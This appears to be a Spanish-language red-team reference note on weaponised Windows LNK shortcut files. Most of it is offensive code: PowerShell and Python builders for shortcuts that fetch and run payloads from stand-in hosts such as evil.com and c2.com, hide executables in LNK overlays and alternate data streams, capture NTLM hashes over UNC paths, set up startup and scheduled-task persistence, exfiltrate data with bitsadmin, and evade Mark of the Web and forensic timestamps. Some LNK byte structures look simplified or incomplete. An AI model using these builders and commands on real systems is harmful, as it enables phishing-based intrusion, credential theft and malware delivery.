---
title: LNK Types
draft: true
tags:
socialImage:
socialDescription:
date: 2026-01-10
modified: 2026-01-10
---
## Tipos
### File on Disk Execution
El LNK apunta directamente a un archivo malicioso ya presente en el sistema o descarga un payload y lo ejecuta. Esta técnica es común en operaciones de persistencia donde el malware ya ha sido desplegado previamente
- Ejemplo cuando el binerio ya esta descargado en el equipo
```powershell
# Create-SimpleExecLNK.ps1
$LNKPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Update.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($LNKPath)

# Ejecuta binario local
$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$Shortcut.Arguments = "/c copy C:\temp\payload.exe %temp%\svchost.exe && %temp%\svchost.exe"
$Shortcut.WorkingDirectory = "C:\Windows\System32"
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,21"
$Shortcut.WindowStyle = 7  # Hidden
$Shortcut.Description = "Windows Update Service"

$Shortcut.Save()

# Ocultar el archivo
$file = Get-Item $LNKPath
$file.Attributes = 'Hidden,System'
```
- si queremos poner que se active con un hotkey podemos agregar esto:
```powershell
$shortcut.HotKey = "CTRL+C"  # Trigger con CTRL+C
$shortcut.Save()
```
### In-Argument Scripts Execution
El payload malicioso está completamente embebido en los argumentos del campo `COMMAND_LINE_ARGUMENTS` del archivo LNK. Utiliza intérpretes nativos de Windows como:​
- **PowerShell**: Ejecución de scripts Base64-encoded o comandos directos
```powershell
function Create-LNKPayload {
    param(
        [String]$LNKName = "Document.lnk",
        [String]$HostedPayload = "http://192.168.1.100/beacon.ps1"
    )
    
    # Payload que descarga y ejecuta script remoto
    $payload = @"
`$wc = New-Object System.Net.Webclient;
`$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
`$wc.proxy = [System.Net.WebRequest]::DefaultWebProxy;
`$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
IEX (`$wc.downloadstring('$HostedPayload'))
"@
    
    # Codificar en Base64
    $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
    
    # Crear LNK
    $obj = New-Object -ComObject WScript.Shell
    $link = $obj.CreateShortcut($LNKName)
    $link.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    $link.Arguments = "-nop -w hidden -enc $encodedPayload"
    $link.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,1"
    $link.WindowStyle = 7
    $link.Save()
}

Create-LNKPayload -LNKName "Report_Q4.lnk" -HostedPayload "http://c2.evil.com/stage2"
```
- **CMD/Batch**: Comandos concatenados y ofuscados
```shell
C:\Windows\System32\cmd.exe /c "certutil -urlcache -f http://evil.com/payload.exe %temp%\update.exe & %temp%\update.exe & start winword.exe"
```
- **MSHTA**: Ejecución de scripts HTA inline
```powershell
$Shortcut.TargetPath = "C:\Windows\System32\mshta.exe"
$Shortcut.Arguments = 'vbscript:Execute("Set o=CreateObject(""WScript.Shell""):o.Run ""powershell -w hidden IEX (New-Object Net.WebClient).DownloadString(""""http://evil.com/rat.ps1"""")"":close")'

```
- **WSH (cscript/wscript)**: Scripts VBS/JScript embebidos
- LOLBin forfiles
```powershell
$Shortcut.Arguments = '/p c:\windows\system32 /m cmd.exe /c "powershell -nop -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString(\'http://c2.com/payload\'))\"""'
```
### Overlay Execution
El payload está oculto en datos adicionales después de la estructura `EXTRA_DATA` del LNK. El archivo LNK extrae y ejecuta este contenido durante la ejecución mediante técnicas como:​
- **Padding directo**: Archivo binario directamente concatenado
	- find/findstr (Extrae contenido usando delimitadores específicos, ignorando líneas que coincidan con el patrón)
	```powershell
	# Con este codigo podemos extraer el contenido ejecutable del archivo lnk
	Select-String -Path $lnk -Pattern "BS:D" | %{[Convert]::FromBase64String($_.Line.Split(':')[1])}
	```
	- Usando python usando findstr con markers
	```python
	# generate_overlay_lnk.py
	import os
	
	def create_lnk_with_overlay(payload_file, output_lnk):
	    # Crear LNK básico con PowerShell
	    lnk_content = bytearray()
	    
	    # SHELL_LINK_HEADER (simplificado)
	    lnk_content += b'\x4C\x00\x00\x00'  # HeaderSize
	    lnk_content += b'\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46'  # LinkCLSID
	    lnk_content += b'\x81\x00\x00\x00'  # LinkFlags (HasLinkTargetIDList + IsUnicode)
	    
	    # Payload command usando findstr
	    magic_marker = "Ev1LStArTsH3re"
	    command = f'findstr /V /C:"{magic_marker}" "%~f0" > "%temp%\\stage2.vbs" & "%temp%\\stage2.vbs"'
	    
	    # TARGET_PATH: cmd.exe
	    target_path = b'\x00\x00C:\\Windows\\System32\\cmd.exe\x00\x00'
	    lnk_content += target_path
	    
	    # COMMAND_LINE_ARGUMENTS
	    args = command.encode('utf-16le')
	    lnk_content += args
	    
	    # EXTRA_DATA terminal
	    lnk_content += b'\x00\x00\x00\x00'
	    
	    # OVERLAY: Agregar payload VBS con marker
	    lnk_content += b'\r\n' + magic_marker.encode() + b'\r\n'
	    
	    # VBScript payload
	    vbs_payload = '''
	Set objShell = CreateObject("WScript.Shell")
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	strURL = "http://evil.com/rat.exe"
	strPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\\svchost.exe"
	Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
	objHTTP.Open "GET", strURL, False
	objHTTP.Send
	Set objStream = CreateObject("ADODB.Stream")
	objStream.Type = 1
	objStream.Open
	objStream.Write objHTTP.ResponseBody
	objStream.SaveToFile strPath, 2
	objStream.Close
	objShell.Run strPath, 0, False
	    '''
	    
	    lnk_content += vbs_payload.encode('utf-8')
	    
	    # Escribir LNK
	    with open(output_lnk, 'wb') as f:
	        f.write(lnk_content)
	
	create_lnk_with_overlay("payload.vbs", "Invoice.lnk")
	
	```
- **Encoding**: Payload en Base64 u otra codificación
	```python
	# lnk_base64_overlay.py
	import base64
	
	def create_b64_overlay_lnk(pe_file, output_lnk):
	    # Leer PE malicioso
	    with open(pe_file, 'rb') as f:
	        pe_bytes = f.read()
	    
	    # Codificar en Base64
	    b64_payload = base64.b64encode(pe_bytes).decode()
	    
	    # Crear LNK structure
	    lnk = bytearray()
	    lnk += b'\x4C\x00\x00\x00'  # Header
	    # ... [estructura LNK completa] ...
	    
	    # PowerShell command para extraer overlay
	    ps_cmd = f'''
	$b64 = Get-Content $PSCommandPath | Select-String -Pattern "^TVqQAA" | Select -First 1;
	$bytes = [Convert]::FromBase64String($b64);
	$path = "$env:TEMP\\update.exe";
	[IO.File]::WriteAllBytes($path, $bytes);
	Start-Process $path -WindowStyle Hidden
	    '''
	    
	    # Agregar comando al LNK
	    target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	    args = f"-nop -w hidden -c \"{ps_cmd}\""
	    
	    # EXTRA_DATA terminal
	    lnk += b'\x00\x00\x00\x00'
	    
	    # Append payload Base64 con marker
	    lnk += b'\r\n' + b64_payload.encode() + b'\r\n'
	    
	    with open(output_lnk, 'wb') as f:
	        f.write(lnk)
	
	create_b64_overlay_lnk("payload.exe", "Document.lnk")
	
	```
- **CAB embedding**: Archivos comprimidos embebidos que se extraen con `expand.exe`
	```powershell
	# Crear CAB con payload
	makecab.exe payload.exe payload.cab
	
	# LNK que extrae y ejecuta
	$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
	$Shortcut.Arguments = '/c findstr /V "^MARKER" "%~f0" > %temp%\p.cab && expand %temp%\p.cab %temp%\svc.exe && %temp%\svc.exe'
	
	# Después de guardar el LNK, agregar CAB como overlay:
	# Get-Content payload.cab -Raw | Add-Content -Path "Document.lnk" -Encoding Byte
	```
- MSHTA Self-Execute (Tolerance)
	```python
	def create_mshta_self_lnk(output_lnk):
	    # Crear LNK básico
	    lnk = create_basic_lnk_structure()
	    
	    # Target: mshta ejecutando el propio LNK
	    target = "C:\\Windows\\System32\\mshta.exe"
	    args = '"%~f0"'
	    
	    # Agregar target y args a estructura LNK
	    # ... [código de construcción LNK] ...
	    
	    # OVERLAY: Contenido HTA malicioso
	    # MSHTA ignora todo hasta encontrar HTML/HTA válido
	    hta_payload = '''
	<html>
	<head>
	<script language="VBScript">
	    Set objShell = CreateObject("WScript.Shell")
	    objShell.Run "powershell -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA...", 0
	    self.close
	</script>
	</head>
	</html>
	    '''
	    
	    lnk += b'\x00\x00\x00\x00'  # EXTRA_DATA terminal
	    lnk += hta_payload.encode('utf-8')
	    
	    with open(output_lnk, 'wb') as f:
	        f.write(lnk)
	```

## Técnicas Adicionales Críticas
-  LNK Icon Smuggling (T1027.012)
	Técnica oficialmente reconocida por MITRE en 2025 que abusa del campo `IconEnvironmentDataBlock` del LNK para descargar payloads
	```powershell
	function Create-IconSmugglingLNK {
	    param(
	        [string]$MaliciousURL = "\\\\evil.com\\share\\payload.exe",
	        [string]$OutputLNK = "Document.lnk"
	    )
	    
	    $obj = New-Object -ComObject WScript.Shell
	    $link = $obj.CreateShortcut($OutputLNK)
	    
	    # Target legítimo como decoy
	    $link.TargetPath = "C:\Windows\System32\cmd.exe"
	    
	    # Payload en el campo de icono (UNC path o HTTP)
	    $link.IconLocation = "$MaliciousURL,0"
	    
	    # Argumentos para ejecutar el payload descargado
	    $link.Arguments = "/c copy $MaliciousURL %temp%\sys.exe & %temp%\sys.exe & start notepad.exe"
	    $link.WindowStyle = 7
	    $link.Save()
	}
	```
> **Bypass**: Windows descarga automáticamente el recurso del icon path al renderizar el LNK, evitando filtros de contenido que solo analizan el TargetPath

- UNC Path NTLM Credential Harvesting
	Técnica de credential theft mediante LNK que apunta a UNC paths remotos:
	```powershell
		# Captura NTLM hashes vía SMB
	function Create-CredHarvesterLNK {
	    $AttackerIP = "192.168.1.100"
	    
	    $obj = New-Object -ComObject WScript.Shell
	    $link = $obj.CreateShortcut("Quarterly_Report.lnk")
	    
	    # UNC path al servidor atacante
	    $link.TargetPath = "\\$AttackerIP\share\report.pdf"
	    $link.IconLocation = "\\$AttackerIP\share\icon.ico,0"
	    $link.WorkingDirectory = "\\$AttackerIP\share"
	    $link.Save()
	}
	```

>[!Notes] KillChain
>
>**Kill Chain**:
>1. Usuario hace doble clic o simplemente **navega** a la carpeta con el LNK
>2. Windows Explorer intenta resolver el UNC path
>3. Inicia autenticación SMB con el servidor atacante
>4. Envía hash NTLMv2 del usuario
>5. Captura con Responder/ntlmrelayx: `responder -I eth0 -v`​
>**Ventaja**: No requiere ejecución, solo que el LNK sea visible en Explorer.

- LNK con CLSID/COM Object Abuse
	Ejecución mediante invocación de COM objects en lugar de binarios directos
	```powershell
		function Create-COMExecLNK {
	    $WshShell = New-Object -ComObject WScript.Shell
	    $Shortcut = $WshShell.CreateShortcut("Update.lnk")
	    
	    # CLSID de WScript.Shell {72C24DD5-D70A-438B-8A42-98424B88AFB8}
	    # Invocado via rundll32 o COM activation
	    $Shortcut.TargetPath = "C:\Windows\System32\rundll32.exe"
	    
	    # Abuse de CLSID para ejecutar script via COM
	    $clsid = "{72C24DD5-D70A-438B-8A42-98424B88AFB8}"
	    $Shortcut.Arguments = "shell32.dll,Control_RunDLL $clsid"
	    
	    # Alternativamente, abuse de MMC snap-ins
	    # $Shortcut.Arguments = "C:\Windows\System32\mmc.exe eventvwr.msc /s"
	    
	    $Shortcut.Save()
	}
	```
> **Evasión**: Muchos EDR/AV no monitorizan invocaciones COM con la misma severidad que spawns de PowerShell/cmd directos

- LNK con DLL Sideloading [Example](https://github.com/m-cetin/dll-sideloading)
	Combina LNK con DLL hijacking para execution sin procesos sospechosos

- LNK Timestamp Manipulation (Anti-Forensics)
	Técnicas para evadir análisis forense basado en timestamps
	- Filename Collision Spoofing:
	```powershell
	# Técnica descubierta en 2025
	# Ejecutar malware.exe primero (genera LNK con timestamp T1)
	Start-Process "C:\malware\malware.exe"
	Start-Sleep -Seconds 300
	
	# Ejecutar binario benigno CON EL MISMO NOMBRE en ruta diferente
	# Windows SOBRESCRIBE el LNK timestamp con el nuevo tiempo T2
	Start-Process "C:\benign\malware.exe"
	
	# Resultado: LNK de malware.exe muestra timestamp de ejecución benigna
	# Forenses ven tiempo T2 (reciente/benigno) en lugar de T1 (real ataque)
	
	```
	- LNK Target Timestomping:
```powershell
	# Detectar timestomping analizando inconsistencias LNK
	function Detect-Timestomping {
	    param([string]$LNKPath)
	    
	    $shell = New-Object -ComObject WScript.Shell
	    $lnk = $shell.CreateShortcut($LNKPath)
	    
	    # LNK almacena timestamps del target en metadata
	    $lnkTargetCreated = $lnk.TargetCreated
	    $actualTargetCreated = (Get-Item $lnk.TargetPath).CreationTime
	    
	    # Si difieren = timestomping detectado
	    if ($lnkTargetCreated -ne $actualTargetCreated) {
	        Write-Host "Timestomping detected on $($lnk.TargetPath)"
	    }
	}
```
> **Para atacantes**: Modificar también los timestamps dentro de la estructura LNK para mantener consistencia.

- LNK con Alternate Data Streams (ADS)
	Ocultar payloads en ADS y ejecutar desde LNK
	```powershell
# Crear payload en ADS
function Create-ADSPayload {
	# Esconder script malicioso en ADS
	$payload = @'
IEX (New-Object Net.WebClient).DownloadString("http://c2.com/rat")
'@
	
	# Escribir en ADS de archivo legítimo
	Set-Content -Path "C:\Users\Public\readme.txt:evil.ps1" -Value $payload
	
	# Crear LNK que ejecuta desde ADS
	$WshShell = New-Object -ComObject WScript.Shell
	$Shortcut = $WshShell.CreateShortcut("Documents.lnk")
	$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
	
	# Ejecutar contenido del ADS
	$Shortcut.Arguments = "-nop -w hidden -c `"IEX (Get-Content 'C:\Users\Public\readme.txt' -Stream evil.ps1)`""
	$Shortcut.IconLocation = "C:\Windows\System32\imageres.dll,4"
	$Shortcut.Save()
}

# ADS no se copia en transferencias de archivos estándar
# Persiste en backups NTFS
# Invisible en dir/ls estándar
	```
	**Extracción de ADS para exfil**
```powershell
# Guardar datos exfiltrados en ADS
$data = Get-Process | ConvertTo-Csv
Set-Content -Path "system.log:data.csv" -Value $data

# Exfiltrar via BITS desde ADS
bitsadmin /transfer exfil /upload http://c2.com/upload "C:\system.log:data.csv" data.csv
```

- LNK Polyglot Files
```python
def create_polyglot_lnk_pdf():
    # Estructura:
    # [LNK Header][LNK Data][EXTRA_DATA terminator]
    # [PDF Header]%PDF-1.4[PDF Content]
    
    lnk_data = create_malicious_lnk()
    pdf_data = open("decoy.pdf", "rb").read()
    
    # Combinar: LNK primero, PDF después
    polyglot = lnk_data + b'\x00\x00\x00\x00'  # LNK terminator
    polyglot += pdf_data
    
    # Resultado: 
    # - Windows ve LNK (por extensión .lnk)
    # - PDF readers ven PDF válido (ignoran garbage al inicio)
    # - Usuarios pueden "inspeccionar" el archivo con Adobe Reader
    
    with open("report.lnk", "wb") as f:
        f.write(polyglot)
```

- LNK con Environment Variable Expansion
	Abuse de variables de entorno para evasión y ofuscación
```powershell
function Create-EnvVarLNK {
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut("System_Update.lnk")
    
    # Usar variables de entorno para ofuscar path
    $Shortcut.TargetPath = "%COMSPEC%"  # C:\Windows\System32\cmd.exe
    
    # Payload ofuscado con env vars
    $Shortcut.Arguments = "/c %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c `"IEX($env:UserProfile+'\AppData\Local\Temp\stage2.ps1')`""
    
    # Working directory con env var
    $Shortcut.WorkingDirectory = "%TEMP%"
    
    # Icon desde env var
    $Shortcut.IconLocation = "%ProgramFiles%\Windows NT\Accessories\wordpad.exe,0"
    
    $Shortcut.Save()
}

# Variaciones avanzadas:
# %PUBLIC%, %APPDATA%, %LOCALAPPDATA%, %ALLUSERSPROFILE%
# %windir%, %systemdrive%, %homedrive%

```

- LNK con Scheduled Task Creation
	LNK que crea tarea programada para persistencia
```powershell
$Shortcut.TargetPath = "C:\Windows\System32\schtasks.exe"
$Shortcut.Arguments = '/Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -w hidden -enc JABjAD0ATgBlAHcALQ..." /RL HIGHEST /F'

# O usando COM Scheduler object:
$Shortcut.Arguments = '/c powershell -c "$s=New-Object -ComObject Schedule.Service;$s.Connect();$t=$s.NewTask(0);$t.RegistrationInfo.Description=\'Update\';$t.Principal.RunLevel=1;$a=$t.Actions.Create(0);$a.Path=\'powershell.exe\';$a.Arguments=\'-w hidden IEX(irm http://c2.com/rat)\';$tr=$t.Triggers.Create(9);$s.GetFolder(\'\').RegisterTaskDefinition(\'Update\',$t,6,$null,$null,3)"'

```

- LNK con WMI/CIM Execution
	Uso de WMI para evasión y fileless execution:
```powershell
$Shortcut.TargetPath = "C:\Windows\System32\wbem\WMIC.exe"
$Shortcut.Arguments = 'process call create "powershell -w hidden -enc <BASE64>"'

# O usando CIM cmdlets:
$Shortcut.Arguments = '/c powershell -c "Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=\'powershell -w hidden IEX(irm http://c2/rat)\'}"'

```

## Técnicas de Evasión y Bypass
### LNK Stomping (2024)

Técnica descubierta por Elastic Security Labs que permite **bypass completo de Mark of the Web (MoTW)** y SmartScreen. Funciona mediante:​

- Creación de LNK con paths no estándar o estructura interna malformada
- Windows Explorer normaliza el path al hacer clic
- Durante la normalización, Windows sobrescribe el LNK sin mantener el Alternate Data Stream (ADS)
- El MoTW metadata se pierde, eliminando las verificaciones de seguridad

Implementación disponible en: `https://github.com/joe-desimone/rep-research/blob/main/lnk_stomping/lnk_stomping.py`[](https://asec.ahnlab.com/en/90299/)​

```python
# lnk_stomping.py - Basado en investigación Elastic Security Labs
import struct

def create_stomping_lnk(output_path):
    # Crear LNK con path malformado
    lnk = bytearray()
    
    # Header estándar
    lnk += struct.pack('<I', 0x0000004C)
    lnk += b'\x01\x14\x02\x00' * 4
    lnk += struct.pack('<I', 0x0000008B)
    
    # LinkTargetIDList con path no normalizado
    # Windows Explorer normalizará esto, perdiendo MoTW
    malformed_path = b'C:\\\\Windows\\\\..\\\\Windows\\\\System32\\\\cmd.exe'
    
    # STRING_DATA con path malformado
    lnk += struct.pack('<H', len(malformed_path))
    lnk += malformed_path
    
    # Arguments
    payload_cmd = '/c powershell -w hidden IEX(New-Object Net.WebClient).DownloadString("http://c2.com/rat")'
    lnk += struct.pack('<H', len(payload_cmd))
    lnk += payload_cmd.encode()
    
    # EXTRA_DATA
    lnk += b'\x00\x00\x00\x00'
    
    with open(output_path, 'wb') as f:
        f.write(lnk)

create_stomping_lnk("Report.lnk")
```

### Extension Spoofing

Los LNK pueden mostrar extensiones falsas mediante manipulación del campo `LinkFlags` y uso de caracteres Unicode Right-to-Left Override (RLO). Permite crear archivos que aparecen como `document.pdf.lnk` pero se muestran como `document.pdf`.​

### UAC Bypass

Builders modernos implementan técnicas de escalado de privilegios para ejecutar payloads sin prompts UAC, abusando de paths confiables o técnicas de DLL hijacking.[](https://www.laditech.com/new-quantum-builder-makes-malicious-windows-lnk-assaults-simple/)​

### Living-off-the-Land Binaries (LOLBins)

Uso exclusivo de binarios nativos de Windows para evitar detección:

- `powershell.exe`, `cmd.exe`
- `mshta.exe` - Ejecución de HTA
- `regsvr32.exe` - Script loading
- `certutil.exe` - Descarga y decode Base64
- `expand.exe` - Extracción de CAB files
- `bitsadmin.exe` - Descarga de payloads

## Herramientas y Builders

### Quantum Builder

Builder comercial vendido en foros underground (€189/mes - €1,500 lifetime):​
- Generación de LNK, HTA e ISO payloads
- +300 iconos disponibles para spoofing
- SmartScreen y MoTW bypass integrado
- Multiple payloads por archivo LNK
- UAC bypass automatizado
- In-memory execution para evasión
- Conexiones con Lazarus Group
### Cyber LNK Exploit Builder

Builder point-and-click identificado en 2025 que democratiza la creación de LNK maliciosos:[](https://abnormal.ai/blog/cyber-lnk-weaponizes-windows-shortcuts-for-malware)​

- Módulos múltiples para evadir diferentes gateways
- Soporte para .lnk, .url y macros
- Generación automática de decoys
- Usado en distribución de Qakbot, IcedID, Emotet y Bumblebee[](https://abnormal.ai/blog/cyber-lnk-weaponizes-windows-shortcuts-for-malware)​

### LNKSmasher (FireEye Red Team)

Herramienta profesional filtrada del arsenal de FireEye Red Team:[](https://www.picussecurity.com/resource/blog/techniques-tactics-procedures-utilized-by-fireeye-red-team-tools)​

- Embedding de payloads arbitrarios en LNK
- Técnicas de persistencia via shortcut modification
- MITRE ATT&CK: T1547.009, T1204.002

### LNK2Pwn

Tool open-source para testing y red team operations:​

- Generación de LNK con comandos maliciosos
- Integración con frameworks C2 como Sliver
- Repositorio: `https://github.com/it-gorillaz/lnk2pwn`

### Atomic Red Team

Framework de testing con tests específicos para LNK:​
- Validación de detecciones
- Simulación de campañas de phishing con LNK
- Integración con pipelines de purple team

## Cadena de Ataque Típica

Una kill chain moderna con LNK sigue este flujo:[](https://docs.redteamleaders.com/offensive-security/initial-access/weaponized-lnk-files-for-initial-access-and-delivery)​

1. **Initial Access**: Email de phishing con archivo ZIP adjunto conteniendo LNK
2. **Execution**: Usuario hace doble-clic en el LNK (aparenta ser PDF/DOCX)
3. **Defense Evasion**: LNK Stomping elimina MoTW, bypass SmartScreen
4. **Command Execution**: PowerShell ejecuta script Base64-encoded desde argumentos del LNK
5. **Staging**: Script descarga payload de segundo stage usando `certutil` o `IWR`
6. **Persistence**: Payload establece persistencia y ejecuta
7. **C2 Connection**: Beacon se conecta a infraestructura del atacante
8. **Decoy**: Abre documento legítimo para evitar sospecha del usuario